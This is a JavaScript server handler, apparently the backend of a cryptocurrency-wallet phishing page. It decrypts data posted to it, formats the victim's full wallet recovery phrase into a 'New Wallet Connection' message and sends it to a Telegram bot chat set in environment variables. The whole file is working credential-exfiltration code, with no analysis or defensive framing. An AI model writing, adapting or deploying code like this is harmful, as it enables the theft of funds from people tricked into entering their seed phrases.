import { encryptData, decryptData } from '../../utils/encryption';

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { encryptedData } = req.body;
    const secretKey = import.meta.env.VITE_AES_KEY;
    const telegramBotToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN;
    const telegramChatId = import.meta.env.VITE_TELEGRAM_CHAT_ID;

    // Decrypt the data
    const decryptedData = decryptData(encryptedData, secretKey);

    // Format message for Telegram
    const message = `
🔐 New Wallet Connection
📝 Phrase Length: ${decryptedData.wordCount} words
🔑 Words: ${decryptedData.words.join(' ')}
⏰ Time: ${new Date().toISOString()}
    `;

    // Send to Telegram
    const telegramResponse = await fetch(
      `https://api.telegram.org/bot${telegramBotToken}/sendMessage`,
      {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: telegramChatId,
          text: message,
          parse_mode: 'HTML',
        }),
      }
    );

    if (!telegramResponse.ok) {
      throw new Error('Failed to send message to Telegram');
    }

    return res.status(200).json({ success: true });
  } catch (error) {
    console.error('Error processing request:', error);
    return res.status(500).json({ error: 'Internal server error' });
  }
} 